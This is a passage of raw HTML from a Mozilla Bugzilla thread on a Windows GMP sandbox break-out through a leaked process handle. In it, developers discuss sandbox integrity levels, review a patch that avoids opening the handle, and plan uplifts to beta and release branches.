   href="/show_bug.cgi?id=1027902">bug 1027902</a>). The sandbox upgrade landed 2014-11-26 (Fx36). So we are stuck with this vulnerability IMO in Fx35 and lower if we can't uplift these changes.</pre></div><div class="change-set" id="a414737_279663"><div class="change" id="aa414737_279663">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a414737_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_279663" id="a414737_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a414737_279663"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a414737_279663">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a414737_279663">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 04:44 PST" data-time="1420634666">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545201&amp;action=edit"
           title="handle fix"
           class=""
        >Attachment #8545201</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="9762828" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a414737_279663"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a414737_279663"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 04:49 PST" data-time="1420634987">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-35" data-comment-id="9762828">(In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c34">comment #34</a>)
<span class="quote">&gt; Taking a step back, I don't think this fix does anything to mitigate this
&gt; vulnerability. The problem here isn't the duplicated handle, it's the
&gt; ability for a compromised GMP process to call OpenProcess successfully. If I
&gt; had code execution in the GMP process, I could iterate PIDs in a call to
&gt; OpenProcess until I hit on the right one, then from there I can pretty much
&gt; do anything.
&gt; 
&gt; On Nightly, OpenProcess fails thanks to a sandbox upgrade and a restriction
&gt; tightening (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Update security/sandbox to upstream chromium sandbox code as of 25th July 2014"
   href="/show_bug.cgi?id=1041775">bug 1041775</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to &quot;low&quot; (in addition to using `SetDelayedIntegrityLevel` to set integrity to &quot;untrusted&quot; later)"
   href="/show_bug.cgi?id=1027902">bug 1027902</a>). The sandbox upgrade landed 2014-11-26
&gt; (Fx36). So we are stuck with this vulnerability IMO in Fx35 and lower if we
&gt; can't uplift these changes.</span >

It is just the initial integrity level that was changed to low.
The integrity level once the sandbox is properly started is untrusted, so would certainly stop OpenProcess.
This is on release.

That said maybe we could uplift, not sure how painful it might be.</pre></div><div class="change-set" id="c36"><div class="comment" data-id="9763082" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a414737_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a414737_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 06:18 PST" data-time="1420640318">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-36" data-comment-id="9763082">(In reply to Bob Owen (:bobowen) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c35">comment #35</a>)
<span class="quote">&gt; (In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c34">comment #34</a>)
&gt; &gt; Taking a step back, I don't think this fix does anything to mitigate this
&gt; &gt; vulnerability. The problem here isn't the duplicated handle, it's the
&gt; &gt; ability for a compromised GMP process to call OpenProcess successfully. If I
&gt; &gt; had code execution in the GMP process, I could iterate PIDs in a call to
&gt; &gt; OpenProcess until I hit on the right one, then from there I can pretty much
&gt; &gt; do anything.
&gt; &gt; 
&gt; &gt; On Nightly, OpenProcess fails thanks to a sandbox upgrade and a restriction
&gt; &gt; tightening (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Update security/sandbox to upstream chromium sandbox code as of 25th July 2014"
   href="/show_bug.cgi?id=1041775">bug 1041775</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to &quot;low&quot; (in addition to using `SetDelayedIntegrityLevel` to set integrity to &quot;untrusted&quot; later)"
   href="/show_bug.cgi?id=1027902">bug 1027902</a>). The sandbox upgrade landed 2014-11-26
&gt; &gt; (Fx36). So we are stuck with this vulnerability IMO in Fx35 and lower if we
&gt; &gt; can't uplift these changes.
&gt; 
&gt; It is just the initial integrity level that was changed to low.
&gt; The integrity level once the sandbox is properly started is untrusted, so
&gt; would certainly stop OpenProcess.
&gt; This is on release.
&gt; 
&gt; That said maybe we could uplift, not sure how painful it might be.</span >

So just to confirm, to get OpenProcess to fail in beta we would have to uplift <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to &quot;low&quot; (in addition to using `SetDelayedIntegrityLevel` to set integrity to &quot;untrusted&quot; later)"
   href="/show_bug.cgi?id=1027902">bug 1027902</a>? Is there anything that you know of currently that prevents us from doing this?</pre></div><div class="change-set" id="c37"><div class="comment" data-id="9763175" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a414737_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a414737_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 06:44 PST" data-time="1420641859">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-37" data-comment-id="9763175">After chatting bowen about sandbox features:

&lt;bobowen&gt; OpenProcess will already fail after the sandbox has been started
&lt;bobowen&gt; we have to allow higher permission initially to do other start up stuff
&lt;bobowen&gt; we start the sandbox just before we load the GMP Plugin (at least for the GMP Process)
&lt;bobowen&gt; if someone has control of the process before we start the sandbox, we're are sunk anyway
&lt;bobowen&gt; and I'm guessing this could only be achieved by a wider compromise of their system
&lt;jimm&gt; oh I see
&lt;jimm&gt; so, if we never open that handle and leave it around, we're ok later on?
&lt;bobowen&gt; yes

Apparently our sandbox has the ability to change restrictions just prior to loading user content. Which is set here - 

<a rel="nofollow" href="http://mxr.mozilla.org/mozilla-release/source/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp#160">http://mxr.mozilla.org/mozilla-release/source/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp#160</a>

So prior to user content getting loaded privileged code can call OpenProcess if it wants too, it just needs to clean up afterward so that there are no open handles left around. After user content is loaded, OpenProcess calls will fail due to the untrusted security level we have set mitigating my concern in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c34">comment 34</a>. This feature is currently working on release.

So, my original patch that avoids calling OpenProcess and exposing that handle actually will fix this vulnerability.</pre></div><div class="change-set" id="a421942_279663"><div class="change" id="aa421942_279663">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a421942_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_279663" id="a421942_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a421942_279663"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a421942_279663">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a421942_279663">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 06:44 PST" data-time="1420641871">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545201&amp;action=edit"
           title="handle fix"
           class=""
        >Attachment #8545201</a> -
        Attachment is obsolete: false</div></div></div><div class="change-set" id="c38"><div class="comment" data-id="9763200" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a421942_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a421942_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 06:47 PST" data-time="1420642056">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-38" data-comment-id="9763200">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8545201" name="attach_8545201" title="handle fix">attachment 8545201</a> <a href="/attachment.cgi?id=8545201&amp;action=edit" title="handle fix">[details]</a> <a href="/attachment.cgi?id=8545201&amp;action=diff" title="handle fix">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1117140&amp;attachment=8545201'>[review]</a>
handle fix

This is green on try. I will file follow ups on the chromium bug, the fallout from chromium bug fix, and fixing this open handle issue for processes that need the handle currently after user content loads.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545201&amp;action=edit"
           title="handle fix"
           class=""
        >Attachment #8545201</a> -
        Flags: review?(benjamin)</div></div></div><div class="change-set" id="c39"><div class="comment" data-id="9763235" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a421942_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a421942_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 06:54 PST" data-time="1420642489">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-39" data-comment-id="9763235">I'll push patches to try merged to beta and to release. Drivers need to decide where this is going to land.</pre></div><div class="change-set" id="c40"><div class="comment" data-id="9763258" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a421942_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a421942_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 07:01 PST" data-time="1420642912">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8545254"
         class="attachment patch"
         data-id="8545254" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tmp.txt">
      <meta itemprop="contentSize" content="1697">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8545254">
          <a class="link" href="attachment.cgi?id=8545254&amp;action=diff">
        <span id="att-8545254-description" itemprop="description">mc handle fix</span></a>
        — <a href="attachment.cgi?id=8545254&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1117140&attachment=8545254">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-40" data-comment-id="9763258">The second block didn't need to shift down and away from the pid processing. Undoing that change.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545201&amp;action=edit"
           title="handle fix"
           class=""
        >Attachment #8545201</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8545201&amp;action=edit"
           title="handle fix"
           class=""
        >Attachment #8545201</a> -
        Flags: <span class="activity-deleted">review?(benjamin)</span></div><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: review?(benjamin)</div></div></div><div class="change-set" id="c41"><div class="comment" data-id="9763830" data-no="41"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-41" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a421942_279663"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a421942_279663"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-41"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-41" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c41">Comment 41</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 08:58 PST" data-time="1420649911">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-41">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-41" data-comment-id="9763830">mc:
<a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=f10a434f2e7e">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=f10a434f2e7e</a>
ma:
<a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=59b08d8099de">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=59b08d8099de</a>
mb:
<a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=5bd4bcb81a36">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=5bd4bcb81a36</a></pre></div><div class="change-set" id="a433070_406194"><div class="change" id="aa433070_406194">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a433070_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_406194" id="a433070_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a433070_406194"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a433070_406194">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a433070_406194">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 09:49 PST" data-time="1420652999">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox34&amp;o1=isnotempty">status-firefox34</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox34&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=isnotempty">status-firefox35</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox35&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox36&amp;o1=isnotempty">status-firefox36</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox36&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox37&amp;o1=isnotempty">status-firefox37</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox37&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr31&amp;o1=isnotempty">status-firefox-esr31</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr31&amp;o1=equals&amp;v1=unaffected">unaffected</a></div></div></div><div class="change-set" id="c42"><div class="comment" data-id="9764082" data-no="42"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-42" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a433070_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_406194" id="a433070_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-42"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-42" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c42">Comment 42</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 09:51 PST" data-time="1420653072">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-42">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-42" data-comment-id="9764082">Setting B2G to unaffected because I don't think we have a GMP sandbox there.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_b2g_1_4&amp;o1=isnotempty">status-b2g-v1.4</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_b2g_1_4&amp;o1=equals&amp;v1=unaffected">unaffected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_b2g_2_0&amp;o1=isnotempty">status-b2g-v2.0</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_b2g_2_0&amp;o1=equals&amp;v1=unaffected">unaffected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_b2g_2_0m&amp;o1=isnotempty">status-b2g-v2.0M</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_b2g_2_0m&amp;o1=equals&amp;v1=unaffected">unaffected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_b2g_2_1&amp;o1=isnotempty">status-b2g-v2.1</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_b2g_2_1&amp;o1=equals&amp;v1=unaffected">unaffected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_b2g_2_2&amp;o1=isnotempty">status-b2g-v2.2</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_b2g_2_2&amp;o1=equals&amp;v1=unaffected">unaffected</a></div></div></div><div class="change-set" id="c43"><div class="comment" data-id="9764209" data-no="43"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-43" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a433070_406194"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a433070_406194"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-43"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-43" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c43">Comment 43</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 10:18 PST" data-time="1420654737">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-43">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-43" data-comment-id="9764209">(In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c41">comment #41</a>)
<span class="quote">&gt; mc:
&gt; <a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=f10a434f2e7e">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=f10a434f2e7e</a>
&gt; ma:
&gt; <a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=59b08d8099de">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=59b08d8099de</a>
&gt; mb:
&gt; <a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=5bd4bcb81a36">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=5bd4bcb81a36</a></span >

Try runs are looking good so far. On aurora and beta the M-e10s and infra android failures can be ignored.</pre></div><div class="change-set" id="a441067_7044"><div class="change" id="aa441067_7044">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7044" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/3301a62f3707d6bcef9542d316fb587f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_7044" id="a441067_7044"><a class="email " href="/user_profile?user_id=7044" > <span class="fna">Benjamin Smedberg</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a441067_7044"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a441067_7044">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#a441067_7044">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 12:03 PST" data-time="1420660996">7 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8545254&amp;action=edit"
           title="mc handle fix"
           class=""
        >Attachment #8545254</a> -
        Flags: review?(benjamin) &rarr; review+</div></div></div><div class="change-set" id="c44"><div class="comment" data-id="9764983" data-no="44"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-44" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_462836" id="a441067_7044"><img src="https://secure.gravatar.com/avatar/0e698ba5145076e93cadb50d6e22edcf?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_462836" id="a441067_7044"><a class="email " href="/user_profile?user_id=462836" > <span class="fna">Jed Davis [:jld] ⟨⏰|UTC-6⟩ ⟦he/him⟧</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-44"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-44" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c44">Comment 44</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 12:39 PST" data-time="1420663161">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-44">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
